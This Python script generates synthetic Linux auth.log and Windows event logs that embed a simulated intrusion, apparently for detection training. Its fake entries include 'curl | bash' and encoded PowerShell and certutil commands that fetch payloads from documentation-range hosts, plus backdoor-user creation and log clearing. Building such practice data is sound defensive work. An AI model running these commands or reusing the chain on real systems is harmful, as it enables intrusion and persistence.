"""Генерация демонстрационных журналов: фоновый «шум» + цепочка атаки.

Используются только адреса из документационных диапазонов RFC 5737
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) и частные 10.0.0.0/8.

Сценарий Linux (web01):
  1. password spraying с 198.51.100.23 по типовым логинам
  2. перебор пароля deploy с 203.0.113.77, затем успешный вход
  3. sudo bash, создание пользователя-бэкдора, curl | bash
Сценарий Windows (WS-ACC01, рабочая станция бухгалтерии):
  1. перебор пароля пользователя buh, затем успешный вход
  2. разведка (whoami, net user, net group)
  3. PowerShell -enc, загрузка файла, новый пользователь в Администраторах
  4. очистка журнала безопасности
"""
from __future__ import annotations

import argparse
import base64
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

LEGIT_USERS = ["ivanov", "petrova", "deploy", "monitoring"]
OFFICE_IPS = [f"10.0.12.{i}" for i in range(10, 40)]


def _syslog(ts: datetime, host: str, proc: str, msg: str, pid: int | None = None) -> str:
    p = f"{proc}[{pid}]" if pid else proc
    return f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {host} {p}: {msg}"


def make_auth_log(rng: random.Random, day: datetime) -> list[tuple[datetime, str]]:
    host, lines = "web01", []

    # фон: обычные входы, редкие опечатки в пароле, рутинный sudo
    for _ in range(120):
        ts = day + timedelta(hours=rng.randint(8, 19), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
        user, ip, pid = rng.choice(LEGIT_USERS), rng.choice(OFFICE_IPS), rng.randint(1000, 60000)
        if rng.random() < 0.08:
            lines.append((ts, _syslog(ts, host, "sshd", f"Failed password for {user} from {ip} port {rng.randint(40000, 65000)} ssh2", pid)))
            ts += timedelta(seconds=rng.randint(5, 20))
        lines.append((ts, _syslog(ts, host, "sshd", f"Accepted publickey for {user} from {ip} port {rng.randint(40000, 65000)} ssh2", pid)))
        if rng.random() < 0.3:
            cmd = rng.choice(["/usr/bin/systemctl restart nginx", "/usr/bin/apt update", "/usr/bin/journalctl -u nginx"])
            ts2 = ts + timedelta(minutes=1)
            lines.append((ts2, _syslog(ts2, host, "sudo", f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}")))

    # 1. password spraying
    t = day + timedelta(hours=2, minutes=10)
    for user in ["admin", "test", "oracle", "postgres", "ubuntu"]:
        lines.append((t, _syslog(t, host, "sshd", f"Failed password for invalid user {user} from 198.51.100.23 port {rng.randint(40000, 65000)} ssh2", 4100)))
        t += timedelta(seconds=rng.randint(60, 90))

    # 2. перебор пароля deploy и успешный вход
    t = day + timedelta(hours=3, minutes=14)
    for _ in range(12):
        lines.append((t, _syslog(t, host, "sshd", f"Failed password for deploy from 203.0.113.77 port {rng.randint(40000, 65000)} ssh2", 5200)))
        t += timedelta(seconds=rng.randint(3, 8))
    t += timedelta(seconds=20)
    lines.append((t, _syslog(t, host, "sshd", "Accepted password for deploy from 203.0.113.77 port 51022 ssh2", 5301)))

    # 3. закрепление
    t += timedelta(minutes=2)
    lines.append((t, _syslog(t, host, "sudo", "deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")))
    t += timedelta(minutes=1)
    lines.append((t, _syslog(t, host, "useradd", "new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash", 5400)))
    t += timedelta(minutes=1)
    lines.append((t, _syslog(t, host, "sudo", "deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.77/i.sh | bash")))
    return lines


def _win(ts: datetime, eid: int, **fields) -> dict:
    rec = {"TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"), "EventID": eid, "Computer": fields.pop("Computer", "WS-ACC01"),
           "Provider": fields.pop("Provider", "Microsoft-Windows-Security-Auditing")}
    rec.update(fields)
    return rec


def make_windows(rng: random.Random, day: datetime) -> list[tuple[datetime, dict]]:
    recs = []
    hosts = ["WS-ACC01", "WS-ACC02", "WS-HR01", "WS-IT03"]
    users = ["buh", "kassir", "hr_smirnova", "it_admin"]
    noise_cmds = [r"C:\Windows\explorer.exe", r'"C:\Program Files\1cv8\bin\1cv8.exe" ENTERPRISE',
                  r'"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"', r"C:\Windows\System32\svchost.exe -k netsvcs"]

    for _ in range(150):
        ts = day + timedelta(hours=rng.randint(8, 18), minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
        host, user = rng.choice(hosts), rng.choice(users)
        if rng.random() < 0.5:
            recs.append((ts, _win(ts, 4624, Computer=host, TargetUserName=user, IpAddress=rng.choice(OFFICE_IPS), LogonType=rng.choice([2, 3, 10]))))
        else:
            cmd = rng.choice(noise_cmds)
            recs.append((ts, _win(ts, 1, Computer=host, Provider="Microsoft-Windows-Sysmon", User=f"CORP\\{user}",
                                  Image=cmd.split('"')[1] if cmd.startswith('"') else cmd.split()[0], CommandLine=cmd)))

    t = day + timedelta(hours=22, minutes=41)
    for _ in range(8):
        recs.append((t, _win(t, 4625, TargetUserName="buh", IpAddress="192.0.2.45", LogonType=10)))
        t += timedelta(seconds=rng.randint(10, 25))
    t += timedelta(seconds=30)
    recs.append((t, _win(t, 4624, TargetUserName="buh", IpAddress="192.0.2.45", LogonType=10)))

    def proc(delta: int, image: str, cmd: str, user="CORP\\buh"):
        nonlocal t
        t += timedelta(seconds=delta)
        recs.append((t, _win(t, 1, Provider="Microsoft-Windows-Sysmon", User=user, Image=image, CommandLine=cmd,
                             ParentImage=r"C:\Windows\explorer.exe")))

    proc(60, r"C:\Windows\System32\whoami.exe", "whoami /all")
    proc(15, r"C:\Windows\System32\net.exe", "net user /domain")
    proc(20, r"C:\Windows\System32\net.exe", 'net group "Domain Admins" /domain')
    payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.45/a.ps1')".encode("utf-16-le")).decode()
    proc(90, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"powershell.exe -NoP -W Hidden -enc {payload}")
    proc(40, r"C:\Windows\System32\certutil.exe", r"certutil.exe -urlcache -split -f http://192.0.2.45/svc.exe C:\Users\Public\svc.exe")

    t += timedelta(minutes=2)
    recs.append((t, _win(t, 4720, TargetUserName="svc_backup", SubjectUserName="buh")))
    t += timedelta(seconds=20)
    recs.append((t, _win(t, 4732, TargetUserName="svc_backup", MemberName="CN=svc_backup", GroupName="Administrators", SubjectUserName="buh")))
    t += timedelta(minutes=5)
    recs.append((t, _win(t, 1102, SubjectUserName="buh", Provider="Microsoft-Windows-Eventlog")))
    return recs


def main() -> None:
    parser = argparse.ArgumentParser(description="Создать демонстрационные журналы")
    parser.add_argument("-o", "--out-dir", default="samples")
    parser.add_argument("--seed", type=int, default=1)
    args = parser.parse_args()

    rng = random.Random(args.seed)
    day = datetime(2026, 11, 10)
    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)

    auth = sorted(make_auth_log(rng, day))
    (out / "auth.log").write_text("\n".join(line for _, line in auth) + "\n", encoding="utf-8")
    win = sorted(make_windows(rng, day), key=lambda x: x[0])
    (out / "windows_events.jsonl").write_text("\n".join(json.dumps(r, ensure_ascii=False) for _, r in win) + "\n", encoding="utf-8")
    print(f"auth.log: {len(auth)} строк, windows_events.jsonl: {len(win)} событий → {out}/")


if __name__ == "__main__":
    main()
